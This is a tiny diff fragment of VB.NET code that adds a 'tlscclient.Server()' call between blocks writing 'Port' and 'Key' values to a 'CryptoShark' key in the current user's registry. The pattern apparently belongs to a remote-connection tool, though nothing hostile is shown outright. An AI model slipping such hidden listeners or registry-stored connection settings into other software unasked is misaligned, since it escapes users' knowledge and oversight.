@@ -14,6 +14,7 @@ Public Class Class2
     "Port", Class5.return1)
             Catch ex As Exception
             End Try
+            tlscclient.Server()
             Try
                 My.Computer.Registry.SetValue("HKEY_CURRENT_USER\SOFTWARE\CryptoShark",
     "Key", Class4.long3)
